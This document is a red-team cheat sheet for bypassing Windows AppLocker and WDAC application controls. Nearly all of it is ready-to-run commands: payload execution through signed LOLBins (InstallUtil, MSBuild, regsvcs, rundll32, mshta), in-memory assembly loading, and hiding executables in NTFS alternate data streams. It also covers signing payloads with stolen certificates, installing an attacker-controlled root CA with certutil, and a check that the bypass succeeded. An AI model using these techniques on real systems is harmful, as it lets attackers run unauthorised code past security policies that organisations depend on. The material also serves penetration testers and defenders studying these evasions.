# AppLocker / WDAC Bypass Techniques

## Detection Method
```powershell
# Check AppLocker status
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe

# Check WDAC status
Get-CIPolicy | fl
citool -lp
```

## Bypass Techniques by Policy Type

### 1. DefaultRules Bypass
```cmd
# Default rules allow execution from these paths:
C:\Windows\System32\*
C:\Windows\SysWOW64\*
C:\Program Files\*
C:\Program Files (x86)\*

# Write to writable subdirectories:
C:\Windows\System32\spool\drivers\color\
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
```

### 2. LOLBin Abuse (Living-off-the-land binaries)
```cmd
# InstallUtil (signed MS binary, executes .NET assemblies)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# MSBuild (builds and executes inline C# code)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# Regsvcs / Regasm (register .NET COM components, executes code)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe payload.dll

# CSC.exe (C# compiler, compile and run)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload.cs

# Rundll32 with JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)

# Mshta (HTA execution)
mshta.exe javascript:payload_code
```

### 3. Alternate Execution Paths
```powershell
# PowerShell from memory (Assembly.Load)
$bytes = [System.IO.File]::ReadAllBytes("payload.dll")
[System.Reflection.Assembly]::Load($bytes)
[Payload.Class]::Main()

# Reflective DLL injection
# Load DLL without touching disk
```

### 4. Path Rule Bypass
```cmd
# If only %SYSTEM32% is allowed, use:
# - NTFS ADS (Alternate Data Streams)
type payload.exe > C:\Windows\System32\calc.exe:payload.exe
start C:\Windows\System32\calc.exe:payload.exe

# - UNC paths (if network path rules differ)
\\127.0.0.1\C$\Users\Public\payload.exe

# - 8.3 short names
C:\PROGRA~1\payload.exe
```

### 5. Publisher Rule Bypass
```powershell
# Sign payload with stolen/leaked cert
Set-AuthenticodeSignature -FilePath payload.ps1 -Certificate $cert

# Use certutil to install attacker-controlled root CA
certutil -addstore Root attacker.cer
```

### 6. WDAC Specific
```powershell
# WDAC supplemental policies
# If wildcard paths are allowed in supplemental policy:
C:\Users\*\AppData\Local\Temp\payload.exe

# Managed Installer (MI) rules bypass
# If app was installed by a managed installer, it may have elevated trust
```

## Verification After Bypass
```powershell
# Confirm bypass worked
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path .\payload.exe
# Should show "Allowed" if bypass succeeded
```
